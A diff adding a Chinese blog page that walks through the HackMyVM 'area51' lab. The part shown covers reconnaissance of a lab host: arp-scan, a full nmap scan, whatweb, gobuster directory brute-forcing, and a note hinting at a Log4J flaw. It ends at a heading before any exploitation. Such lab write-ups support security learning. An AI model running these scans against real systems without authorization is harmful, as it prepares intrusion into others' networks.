@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>area51 :: l1uyun_blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta charset="UTF-8"/>
+<meta name="renderer" content="webkit"/>
+<meta name="force-rendering" content="webkit"/>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="主机发现 ~/workspace sudo arp-scan -I ens33 -l Interface: ens33, type: EN10MB, MAC: 00:0c:29:a1:f0:49, IPv4: 192.168.89.15 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.89.13 08:00:27:96:66:e2 PCS Systemtechnik GmbH 192.168.89.99 f6:39:4a:3d:95:18 (Unknown: locally administered) 192.168.89.247 ca:a7:78:4d:50:e1 (Unknown: locally administered) 端口扫描 ~/workspace sudo nmap 192.168.89.13 -Pn -sT -p- -A --min-rate=10000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 07:34 EDT Nmap scan report for 192.168.89.13 Host is up (0.0025s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 de:bf:2a:93:86:b8:b3:a3:13:5b:46:66:34:d6:dc:b1 (RSA) | 256 a9:df:bb:71:90:6c:d1:2f:e7:48:97:2e:ad:7b:15:d3 (ECDSA) |_ 256 78:75:83:1c:03:03:a1:92:4f:73:8e:f2:2d:23:d2:0e (ED25519) 80/tcp open http Apache httpd 2.4.51 ((Debian)) |_http-server-header: Apache/2.4.51 (Debian) |_http-title: FBI Access 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Site doesn&#39;t have a title (application/json). MAC Address: 08:00:27:96:66:E2 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.8 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 2.52 ms 192.168.89.13 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds web_80 ~/workspace whatweb 192.168.89.13 http://192.168.89.13 [200 OK] Apache[2.4.51], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.51 (Debian)], IP[192.168.89.13], JQuery[2.1.3], PasswordField, Script, Title[FBI Access] ~/workspace whatweb 192.168.89.13:8080 http://192.168.89.13:8080 [400 Bad Request] Country[RESERVED][ZZ], IP[192.168.89.13] "/>
+<meta name="keywords" content=""/>
+
+<link href="/atom.xml" title="l1uyun_blog" type="application/rss+xml">
+<link rel="canonical" href="https://l1uyun.one/posts/hmv_area51/" />
+<link rel="stylesheet" href="//cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="/theme-20230215.css">
+<link rel="shortcut icon" href="https://l1uyun.one/favicon.ico">
+<link rel="apple-touch-icon" href="https://l1uyun.one/favicon.ico">
+<link rel="bookmark" href="https://l1uyun.one/favicon.ico">
+<link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://l1uyun.one/favicon.ico">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="apple-mobile-web-app-title" content="l1uyun_blog">
+
+<script defer src="https://cn.vercount.one/js"></script>
+<meta property="og:url" content="https://l1uyun.one/posts/hmv_area51/">
+  <meta property="og:site_name" content="l1uyun_blog">
+  <meta property="og:title" content="area51">
+  <meta property="og:description" content="主机发现 ~/workspace sudo arp-scan -I ens33 -l Interface: ens33, type: EN10MB, MAC: 00:0c:29:a1:f0:49, IPv4: 192.168.89.15 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.89.13 08:00:27:96:66:e2 PCS Systemtechnik GmbH 192.168.89.99 f6:39:4a:3d:95:18 (Unknown: locally administered) 192.168.89.247 ca:a7:78:4d:50:e1 (Unknown: locally administered) 端口扫描 ~/workspace sudo nmap 192.168.89.13 -Pn -sT -p- -A --min-rate=10000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 07:34 EDT Nmap scan report for 192.168.89.13 Host is up (0.0025s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 de:bf:2a:93:86:b8:b3:a3:13:5b:46:66:34:d6:dc:b1 (RSA) | 256 a9:df:bb:71:90:6c:d1:2f:e7:48:97:2e:ad:7b:15:d3 (ECDSA) |_ 256 78:75:83:1c:03:03:a1:92:4f:73:8e:f2:2d:23:d2:0e (ED25519) 80/tcp open http Apache httpd 2.4.51 ((Debian)) |_http-server-header: Apache/2.4.51 (Debian) |_http-title: FBI Access 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Site doesn&#39;t have a title (application/json). MAC Address: 08:00:27:96:66:E2 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.8 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 2.52 ms 192.168.89.13 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds web_80 ~/workspace whatweb 192.168.89.13 http://192.168.89.13 [200 OK] Apache[2.4.51], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.51 (Debian)], IP[192.168.89.13], JQuery[2.1.3], PasswordField, Script, Title[FBI Access] ~/workspace whatweb 192.168.89.13:8080 http://192.168.89.13:8080 [400 Bad Request] Country[RESERVED][ZZ], IP[192.168.89.13]">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-04-16T19:27:27+08:00">
+    <meta property="article:modified_time" content="2024-11-24T19:25:01+08:00">
+    <meta property="article:tag" content="Sec/Hackmyvm">
+
+
+
+
+<script>
+if ( false || (!!window.MSInputMethodContext && !!document.documentMode)) {
+    document.write('\x3Cscript id="_iealwn_js" data-outver="11" src="https://support.dmeng.net/ie-alert-warning/latest.js">\x3C/script>');
+}
+</script>
+<script async defer data-website-id="c27bd84b-02a3-4c3f-a168-0d7fadec9c74" src="https://u.edui.fun/lmmtj.js"></script>
+
+    
+  <link rel="prefetch" href="https://l1uyun.one/posts/hmv_adria/">
+  <link rel="prefetch" href="https://l1uyun.one/posts/hmv_slowman/">
+
+  </head>
+  <body class="">
+    <script>var getTheme = localStorage.getItem("theme") || '';if(getTheme == 'dark'){document.body.classList.add("dark")}else if(getTheme == 'light'){document.body.classList.remove("dark")}</script>
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://l1uyun.one/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__text">l1uyun_blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu hidden">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/posts/reading/">读书</a></li>
+        
+      
+        
+          <li><a href="/posts/sec/">sec</a></li>
+        
+      
+        
+          <li><a href="/posts/chat/">闲聊</a></li>
+        
+      
+        
+          <li><a href="/archives/">归档</a></li>
+        
+      
+        
+          <li><a href="/about/">关于我</a></li>
+        
+      
+        
+          <li><a href="/search/">🔍</a></li>
+        
+      
+    
+    <li><a href="javascript:;" onclick="randomPost()" title="随机访问一篇文章"><svg t="1660103436159" class="icon search-box-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1184" width="32" height="32"><path d="M421.376 481.28s117.248 24.576 175.104-8.704c0 0-89.6 70.144-89.6 166.4 0.512-0.512-8.192-121.344-85.504-157.696zM438.784 969.216s68.608 6.656 68.608-80.896c0 0 3.072 88.576 65.024 78.336 0 0.512-50.688 22.016-133.632 2.56zM161.28 238.08s-30.208 65.536 11.264 91.648c0 0-67.072-17.408-81.408 37.376 0 0 8.704-82.944 70.144-129.024zM857.6 227.328s49.152 50.176 1.024 81.408c0 0 58.88-18.432 66.56 36.352 0 0 5.12-69.632-67.584-117.76z" p-id="1185"></path><path d="M443.392 970.752c-5.632 0-10.752-1.024-15.36-3.072l-270.848-157.184-1.536-1.024s-1.024-1.024-4.608-2.56c-51.2-29.184-62.976-94.208-65.536-120.832V386.56c0-3.072 0.512-7.168 1.024-11.264l0.512-3.584 1.024-2.56c19.456-50.688 76.8-51.2 103.936-44.032l-1.536 5.632 4.096-6.144L476.16 486.4l18.944 37.888c20.992 36.864 29.184 77.824 32.768 99.84v258.048c-4.608 56.32-36.864 76.288-55.808 82.944-1.024 0.512-15.36 5.632-28.672 5.632z m-262.144-196.096l263.168 152.576c12.288-0.512 36.864-6.656 40.448-48.128v-250.368c-4.608-31.744-20.992-103.936-72.192-128L322.56 445.44l1.536 3.072-142.336-82.432c-2.048-0.512-40.448-9.216-52.736 15.872-0.512 2.56-0.512 4.608-0.512 6.144v294.4c1.536 16.896 9.728 67.072 43.52 86.528 3.584 2.048 6.656 4.096 9.216 5.632z" p-id="1186"></path><path d="M837.632 212.992c6.656 4.096 12.8 7.168 18.432 10.752l1.536 1.024 1.536 1.536c5.12 4.096 10.752 9.216 16.384 15.36 6.144 11.776 5.632 33.28 4.608 49.152-1.024 12.288-6.656 30.208-26.624 44.544l-1.024 0.512-247.808 156.672c-26.624 14.336-62.976 18.432-96.256 18.432-40.96 0-77.824-6.656-89.088-8.704l-3.072-0.512-245.248-142.336c-39.424-29.696-28.16-85.504-15.36-113.664l2.56-6.144 263.68-166.912c29.184-14.336 104.448-43.008 173.056-1.024 3.584 2.56 58.368 34.304 119.296 69.632M431.616 460.8c40.448 7.168 114.176 13.824 152.576-6.144l244.736-155.136c7.168-5.632 8.192-10.24 8.704-12.8 1.024-11.264-9.728-26.624-15.36-32.768-55.808-32.256-243.712-141.312-250.368-145.408-49.664-30.72-107.008-9.216-130.048 2.56L192.512 268.8c-4.096 12.288-12.288 42.496 3.584 55.808l235.52 136.192z" p-id="1187"></path><path d="M831.488 299.008c4.096-1.024 38.4-11.264 66.048 6.144 7.168 4.608 17.92 11.776 24.064 24.576 1.024 5.632 4.096 10.752 4.608 16.896v2.048l-1.024 323.072c-5.12 35.328-22.528 91.648-77.312 125.44l-5.12 3.584h-1.024l-262.144 165.888-4.608 0.512c-4.096 0.512-8.704 1.024-12.8 1.024-15.872 0-30.208-5.12-41.984-14.848-24.576-20.48-32.768-55.808-35.328-73.728l-1.024-252.928h1.536c6.144-96.768 88.576-164.864 96.768-171.008l-0.512-0.512L829.44 299.52m-301.056 567.808c0.512 10.24 5.12 41.472 19.968 53.76 3.072 2.56 7.68 5.632 16.384 5.12l264.704-167.936c56.32-38.4 53.76-115.712 53.76-116.224l-0.512-32.256 1.024-250.368h-0.512c-1.536-12.8-7.168-16.384-8.704-17.408-8.704-5.632-23.552-3.072-28.672-2.048l-235.52 148.992c-1.024 0.512-80.896 65.024-80.896 149.504h-1.536l0.512 228.864zM435.2 264.192c0 27.648 31.744 50.176 71.168 50.176s71.168-22.528 71.168-50.176-31.744-50.176-71.168-50.176S435.2 236.544 435.2 264.192z" p-id="1188"></path><path d="M663.552 782.848c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-50.176-0.512-50.176-31.232s22.528-67.072 50.176-80.384c27.136-13.824 49.664 0 49.664 31.232zM760.32 602.624c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-49.664-0.512-49.664-31.232s22.528-67.072 49.664-80.384c27.136-13.824 49.664 0.512 49.664 31.232zM867.84 428.032c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-50.176-0.512-50.176-31.232s22.528-67.072 50.176-80.384c27.136-13.824 49.664 0 49.664 31.232zM270.848 538.112c0 30.72-22.016 41.984-48.64 24.576-27.136-16.896-48.64-55.808-48.64-86.528 0-30.72 22.016-41.984 48.64-24.576 26.624 16.896 48.64 55.808 48.64 86.528zM432.128 823.296c0 30.72-22.016 41.984-48.64 24.576-26.624-17.408-48.64-55.808-48.64-86.528 0-30.72 22.016-41.984 48.64-24.576 26.624 16.896 48.64 55.808 48.64 86.528z" p-id="1189"></path></svg></a></li>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/posts/reading/">读书</a></li>
+      
+    
+      
+        <li><a href="/posts/sec/">sec</a></li>
+      
+    
+      
+        <li><a href="/posts/chat/">闲聊</a></li>
+      
+    
+      
+        <li><a href="/archives/">归档</a></li>
+      
+    
+      
+        <li><a href="/about/">关于我</a></li>
+      
+    
+      
+        <li><a href="/search/">🔍</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger hidden">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+
+      <div class="content">
+        
+  
+  
+  
+  
+  <div class="post sec">
+    <div  class="breadcrumb">
+  
+
+  
+
+  
+
+  
+
+<li>
+  <a href="https://l1uyun.one/">首页</a>
+</li>
+
+
+<li>
+  <a href="https://l1uyun.one/posts/">Posts</a>
+</li>
+
+
+<li>
+  <a href="https://l1uyun.one/posts/sec/">sec</a>
+</li>
+
+
+<li class="active">
+  <a href="https://l1uyun.one/posts/hmv_area51/">area51</a>
+</li>
+
+</div>
+
+
+  
+    <h2 class="post-title"><a href="https://l1uyun.one/posts/hmv_area51/">area51</a></h2>
+    <div class="post-meta">
+      <div  class="meta-item">
+        本文总阅读量 <span id="vercount_value_page_pv">Loading</span> 次
+      </div>
+      
+        <span class="post-date">2024-04-16</span>
+        
+          
+        
+      
+    </div>
+    
+  
+    <div class="post-content">
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#主机发现">主机发现</a></li>
+        <li><a href="#端口扫描">端口扫描</a></li>
+        <li><a href="#web_80">web_80</a></li>
+        <li><a href="#web_8080">web_8080</a></li>
+        <li><a href="#log4j_rce">log4j_RCE</a></li>
+        <li><a href="#docker环境">docker环境</a></li>
+        <li><a href="#枚举">枚举</a></li>
+        <li><a href="#ssh登录靶机">ssh登录靶机</a></li>
+        <li><a href="#枚举-1">枚举</a></li>
+        <li><a href="#横向移动">横向移动</a></li>
+        <li><a href="#利用定时任务提权">利用定时任务提权</a></li>
+        <li><a href="#root">root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <h2 id="主机发现">主机发现</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace sudo arp-scan -I ens33 -l
+</span></span><span style="display:flex;"><span>Interface: ens33, type: EN10MB, MAC: 00:0c:29:a1:f0:49, IPv4: 192.168.89.15
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>192.168.89.13   08:00:27:96:66:e2       PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>192.168.89.99   f6:39:4a:3d:95:18       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>192.168.89.247  ca:a7:78:4d:50:e1       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace sudo nmap 192.168.89.13 -Pn -sT -p- -A --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-16 07:34 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.89.13
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0025s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh         OpenSSH 8.4p1 Debian <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> de:bf:2a:93:86:b8:b3:a3:13:5b:46:66:34:d6:dc:b1 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a9:df:bb:71:90:6c:d1:2f:e7:48:97:2e:ad:7b:15:d3 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 78:75:83:1c:03:03:a1:92:4f:73:8e:f2:2d:23:d2:0e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http        Apache httpd 2.4.51 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.51 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: FBI Access
+</span></span><span style="display:flex;"><span>8080/tcp open  nagios-nsca Nagios NSCA
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>application/json<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:96:66:E2 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Linux 4.X|5.X
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+</span></span><span style="display:flex;"><span>OS details: Linux 4.15 - 5.8
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE
+</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   2.52 ms 192.168.89.13
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.70 seconds
+</span></span></code></pre></div><h2 id="web_80">web_80</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace whatweb 192.168.89.13
+</span></span><span style="display:flex;"><span>http://192.168.89.13 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.51<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Debian Linux<span style="color:#f92672">][</span>Apache/2.4.51 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>192.168.89.13<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>2.1.3<span style="color:#f92672">]</span>, PasswordField, Script, Title<span style="color:#f92672">[</span>FBI Access<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>~/workspace whatweb 192.168.89.13:8080
+</span></span><span style="display:flex;"><span>http://192.168.89.13:8080 <span style="color:#f92672">[</span><span style="color:#ae81ff">400</span> Bad Request<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>192.168.89.13<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_1.png" alt="HMV_area51_image_1"  /></p>
+<p>进去是个登录窗口, 随便输入个凭据, 点击登录. 没有数据包发出去
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_2.png" alt="HMV_area51_image_2"  />
+就是个js</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>var working <span style="color:#f92672">=</span> false;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">$(</span><span style="color:#e6db74">&#39;.login&#39;</span><span style="color:#66d9ef">)</span>.on<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#66d9ef">function</span><span style="color:#f92672">(</span>e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  e.preventDefault<span style="color:#f92672">()</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>working<span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  working <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>  var $this <span style="color:#f92672">=</span> <span style="color:#66d9ef">$(</span>this<span style="color:#66d9ef">)</span>,
+</span></span><span style="display:flex;"><span>    $state <span style="color:#f92672">=</span> $this.find<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;button &gt; .state&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>  $this.addClass<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;loading&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>  $state.html<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Authenticating&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>  setTimeout<span style="color:#f92672">(</span><span style="color:#66d9ef">function</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    $this.addClass<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;ok&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    $state.html<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Not authorized. The access attempt will be reported.&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    setTimeout<span style="color:#f92672">(</span><span style="color:#66d9ef">function</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      $state.html<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Log in&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>      $this.removeClass<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;ok loading&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>      working <span style="color:#f92672">=</span> false;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>, 4000<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>, 3000<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">})</span>;
+</span></span></code></pre></div><p>扫一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>☁  workspace  sudo gobuster dir  -u <span style="color:#e6db74">&#39;http://192.168.89.13/&#39;</span> -w ./directory-list-2.3-medium.txt -r -t <span style="color:#ae81ff">50</span>  -x txt,js,html,php  2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.89.13/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                ./directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,js,html,php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Follow Redirect:         true
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1131<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/video                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4655<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/script.js            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 525<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/radar                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 730<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/note.txt             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 119<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace curl 192.168.89.13/note.txt
+</span></span><span style="display:flex;"><span>Alert!
+</span></span><span style="display:flex;"><span>We have a vulnerability in our java application...
+</span></span><span style="display:flex;"><span>Notify the programming department to check Log4J.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-Admin#
+</span></span><span style="display:flex;"><span>~/workspace
+</span></span></code></pre></div><p>说有一个java Application的话, 换个端口吧</p>
+<h2 id="web_8080">web_8080</h2>
